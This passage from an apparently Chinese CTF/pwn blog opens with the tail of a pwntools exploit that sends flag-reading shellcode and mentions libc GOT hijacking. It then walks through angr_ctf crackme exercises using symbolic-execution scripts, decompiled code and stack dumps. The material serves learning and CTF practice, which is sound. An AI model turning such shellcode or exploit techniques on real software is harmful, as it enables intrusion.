class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1;</span></span><br><span class="line"><span class="string">    push 0x100;</span></span><br><span class="line"><span class="string">    push rbx;</span></span><br><span class="line"><span class="string">    push rsp;</span></span><br><span class="line"><span class="string">    pop rsi;</span></span><br><span class="line"><span class="string">    mov rdx, 1;</span></span><br><span class="line"><span class="string">    mov rax, 20;</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/flag2\x00\x00&#x27;</span> + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>学到一些细节上的知识，也尝试了一下 libc GOT 劫持</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/13/angr%E7%9A%84%E7%BB%83%E4%B9%A0%E4%B8%8E%E6%8F%90%E5%8D%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/13/angr%E7%9A%84%E7%BB%83%E4%B9%A0%E4%B8%8E%E6%8F%90%E5%8D%87/" class="post-title-link" itemprop="url">angr的练习与提升</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-13 15:36:59 / Modified: 15:46:15" itemprop="dateCreated datePublished" datetime="2022-12-13T15:36:59+08:00">2022-12-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>26k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>24 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>00_angr_find</strong></p>
<p>了解 angr 基础方法后便可轻松求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./00_angr_find&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line">sm.explore(find=<span class="number">0x08048678</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>01_angr_avoid</strong></p>
<img src="/2022/12/13/angr%E7%9A%84%E7%BB%83%E4%B9%A0%E4%B8%8E%E6%8F%90%E5%8D%87/1670588458759.png" class width="1670588458759"> 
<p>main 函数过大，IDA 分析失败，传统逆向受阻，但可以用 angr 求解：</p>
<p>不过这个脚本分析的时间有点长，添加 <code>avoid</code> 可以进行加速：（告诉 angr 哪些地址不需要到达）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">avoid_me</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  should_succeed = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>逆向分析题目时，发现题目已经给出了提示，在 <code>avoid</code> 处写入此地址即可</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">maybe_good</span><span class="params">(<span class="keyword">char</span> *s1, <span class="keyword">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( should_succeed &amp;&amp; !<span class="built_in">strncmp</span>(s1, s2, <span class="number">8u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>同时，我们还可以把 <code>Try again</code> 处的地址写入 <code>avoid</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./01_angr_avoid&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line">sm.explore(find=<span class="number">0x080485E0</span>,avoid=[<span class="number">0x080485A8</span>,<span class="number">0x080485F2</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>02_angr_find_condition</strong></p>
<p>这个题目与之前的有所不同，如果按照之前的思路来写脚本是跑不出答案的</p>
<p>用 IDA 分析一下就知道原因了： </p>
<img src="/2022/12/13/angr%E7%9A%84%E7%BB%83%E4%B9%A0%E4%B8%8E%E6%8F%90%E5%8D%87/1670595128522.png" class width="1670595128522"> 
<ul>
<li>程序把 <code>Good Job</code> 和 <code>Try again</code> 分为很多份，每个执行流分支都有一个，并且地址不同</li>
<li>在这些 <code>Good Job</code> 中，肯定有一个是可以到达的，但是我们不确定是哪个，因此也不能确定要查找的地址</li>
</ul>
<p>于是我们改变 angr 的写法，使其查找输出 <code>Good Job</code> 的那一个路径分支：（用同样的办法可以避免输出 <code>Try again</code> 的那些路径分支）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./02_angr_find_condition&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>03_angr_symbolic_registers</strong></p>
<p>本题目有多个输入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_user_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x %x %x&quot;</span>, &amp;v1, &amp;v2, v3);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>老版本的 angr 不能很好地处理多输入，因此需要用一些复杂的方法来解决问题（新版本的 angr 可以直接解出答案）</li>
</ul>
<p>根据程序逻辑，输入的3个字符串的地址分别存于 <code>eax ebx edx</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804892</span>A push    offset aXXX     ; <span class="string">&quot;%x %x %x&quot;</span></span><br><span class="line">.text:<span class="number">0804892F</span> call    ___isoc99_scanf</span><br><span class="line">.text:<span class="number">08048934</span> add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048937</span> mov     ecx, [ebp+var_18]</span><br><span class="line">.text:<span class="number">0804893</span>A mov     eax, ecx</span><br><span class="line">.text:<span class="number">0804893</span>C mov     ecx, [ebp+var_14]</span><br><span class="line">.text:<span class="number">0804893F</span> mov     ebx, ecx</span><br><span class="line">.text:<span class="number">08048941</span> mov     ecx, [ebp+var_10]</span><br><span class="line">.text:<span class="number">08048944</span> mov     edx, ecx</span><br></pre></td></tr></table></figure>
<p>在 main 中把 <code>eax ebx edx</code> 放回栈，然后调用对应的函数进行加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804897B</span> call    get_user_input</span><br><span class="line">.text:<span class="number">08048980</span> mov     [ebp+var_14], eax</span><br><span class="line">.text:<span class="number">08048983</span> mov     [ebp+var_10], ebx</span><br><span class="line">.text:<span class="number">08048986</span> mov     [ebp+var_C], edx</span><br></pre></td></tr></table></figure>
<p>既然 angr 不支持多输入，我们就可以直接把 <code>get_user_input</code> 跳过（从 <code>0x08048980</code> 开始执行程序），然后把符号向量放入 <code>eax ebx edx</code>：</p>
<ul>
<li><code>claripy</code> 模块可以手动创建符号向量</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./03_angr_symbolic_registers&quot;</span>)</span><br><span class="line">init_state = p.factory.blank_state(addr=<span class="number">0x08048980</span>)</span><br><span class="line"></span><br><span class="line">password1 = claripy.BVS(<span class="string">&quot;password1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&quot;password2&quot;</span>,<span class="number">32</span>)</span><br><span class="line">password3 = claripy.BVS(<span class="string">&quot;password3&quot;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">init_state.regs.eax=password1</span><br><span class="line">init_state.regs.ebx=password2</span><br><span class="line">init_state.regs.edx=password3</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">answer1 = found_state.solver.<span class="built_in">eval</span>(password1)</span><br><span class="line">answer2 = found_state.solver.<span class="built_in">eval</span>(password2)</span><br><span class="line">answer3 = found_state.solver.<span class="built_in">eval</span>(password3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:x&#125; &#123;:x&#125; &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(answer1,answer2,answer3))</span><br></pre></td></tr></table></figure>
<p><strong>04_angr_symbolic_stack</strong></p>
<p>本题目有多个输入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">handle_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2[<span class="number">3</span>]; <span class="comment">// [esp+Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %u&quot;</span>, v2, &amp;v1);</span><br><span class="line">  v2[<span class="number">0</span>] = complex_function0(v2[<span class="number">0</span>]);</span><br><span class="line">  v1 = complex_function1(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2[<span class="number">0</span>] == <span class="number">0x773024D1</span> &amp;&amp; v1 == <span class="number">0xBC4311CF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次输入的数据存放在栈中，因此需要将符号向量存放入栈中</p>
<p>这时我们要模拟栈帧构建的过程，把符号向量 <code>push</code> 到正确的位置上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">08048679</span> push    ebp</span><br><span class="line">.text:<span class="number">0804867</span>A mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804867</span>C sub     esp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0804867F</span> sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">08048682</span> lea     eax, [ebp+var_10] <span class="comment">/* target1 */</span></span><br><span class="line">.text:<span class="number">08048685</span> push    eax</span><br><span class="line">.text:<span class="number">08048686</span> lea     eax, [ebp+var_C] <span class="comment">/* target2 */</span></span><br><span class="line">.text:<span class="number">08048689</span> push    eax</span><br><span class="line">.text:<span class="number">0804868</span>A push    offset aUU      ; <span class="string">&quot;%u %u&quot;</span></span><br><span class="line">.text:<span class="number">0804868F</span> call    ___isoc99_scanf</span><br></pre></td></tr></table></figure>
<ul>
<li>目标就是把 <code>target1</code> 和 <code>target2</code> 处的局部变量给替换为符号向量</li>
</ul>
<p>先调试程序，分析输入执行完毕后的栈帧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp <span class="number">0xffc983c0</span> —▸ <span class="number">0x80487b3</span> ◂— <span class="number">0x25207525</span> <span class="comment">/* &#x27;%u %u&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│     <span class="number">0xffc983c4</span> —▸ <span class="number">0xffc983dc</span> ◂— <span class="number">0x3d</span> <span class="comment">/* &#x27;=&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│     <span class="number">0xffc983c8</span> —▸ <span class="number">0xffc983d8</span> ◂— <span class="number">0x3d</span> <span class="comment">/* &#x27;=&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│     <span class="number">0xffc983cc</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│     <span class="number">0xffc983d0</span> —▸ <span class="number">0xf7f24088</span> (environ) —▸ <span class="number">0xffc984ac</span> —▸ <span class="number">0xffc9a15b</span> ◂— <span class="string">&#x27;HTTP_PROXY=http://127.0.0.1:7890/&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│     <span class="number">0xffc983d4</span> —▸ <span class="number">0xf7f75990</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│ edx <span class="number">0xffc983d8</span> ◂— <span class="number">0x3d</span> <span class="comment">/* target1 */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│     <span class="number">0xffc983dc</span> ◂— <span class="number">0x3d</span> <span class="comment">/* target2 */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│     <span class="number">0xffc983e0</span> —▸ <span class="number">0x80487ce</span> ◂— <span class="number">0x65746e45</span> <span class="comment">/* &#x27;Enter the password: &#x27; */</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│     <span class="number">0xffc983e4</span> —▸ <span class="number">0xffc984a4</span> —▸ <span class="number">0xffc9a12b</span> ◂— <span class="string">&#x27;/home/yhellow/tools/angr/04_angr_symbolic_stack&#x27;</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0028</span>│ ebp <span class="number">0xffc983e8</span> —▸ <span class="number">0xffc983f8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>我们只需要关注 <code>target1 target2</code> 的位置，把符号向量 <code>push</code> 到这里即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./04_angr_symbolic_stack&quot;</span>)</span><br><span class="line">init_state = p.factory.blank_state(addr=<span class="number">0x08048694</span>)</span><br><span class="line"></span><br><span class="line">password1 = claripy.BVS(<span class="string">&quot;password1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&quot;password2&quot;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">init_state.stack_push(init_state.regs.ebp)</span><br><span class="line">init_state.regs.ebp = init_state.regs.esp</span><br><span class="line">init_state.regs.esp -= <span class="number">0x8</span></span><br><span class="line">init_state.stack_push(password1)</span><br><span class="line">init_state.stack_push(password2)</span><br><span class="line">init_state.regs.esp -= <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">answer1 = found_state.solver.<span class="built_in">eval</span>(password1)</span><br><span class="line">answer2 = found_state.solver.<span class="built_in">eval</span>(password2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:d&#125; &#123;:d&#125;&quot;</span>.<span class="built_in">format</span>(answer1,answer2))</span><br></pre></td></tr></table></figure>
<p><strong>05_angr_symbolic_memory</strong></p>
<p>本题目有多个输入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(user_input, <span class="number">0</span>, <span class="number">0x21</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s %8s %8s&quot;</span>, user_input, &amp;unk_A1BA1C8, &amp;unk_A1BA1D0, &amp;unk_A1BA1D8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0xA1BA1C0</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">0xA1BA1C0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(user_input, <span class="string">&quot;NJPURZPCDYEAXCSJZJMPSOMBFDDLHBVN&quot;</span>, <span class="number">0x20</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次输入的数据存放在全局变量中，直接在目标地址上写入符号向量即可（注意顺序）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./05_angr_symbolic_memory&quot;</span>)</span><br><span class="line">init_state = p.factory.blank_state(addr=<span class="number">0x08048601</span>)</span><br><span class="line"></span><br><span class="line">password1 = claripy.BVS(<span class="string">&quot;password1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&quot;password2&quot;</span>,<span class="number">64</span>)</span><br><span class="line">password3 = claripy.BVS(<span class="string">&quot;password3&quot;</span>,<span class="number">64</span>)</span><br><span class="line">password4 = claripy.BVS(<span class="string">&quot;password4&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">password1_addr = <span class="number">0x0A1BA1C0</span></span><br><span class="line">password2_addr = <span class="number">0x0A1BA1C8</span></span><br><span class="line">password3_addr = <span class="number">0x0A1BA1D0</span></span><br><span class="line">password4_addr = <span class="number">0x0A1BA1D8</span></span><br><span class="line"></span><br><span class="line">init_state.memory.store(password1_addr,password1)</span><br><span class="line">init_state.memory.store(password2_addr,password2)</span><br><span class="line">init_state.memory.store(password3_addr,password3)</span><br><span class="line">init_state.memory.store(password4_addr,password4)</span><br><span 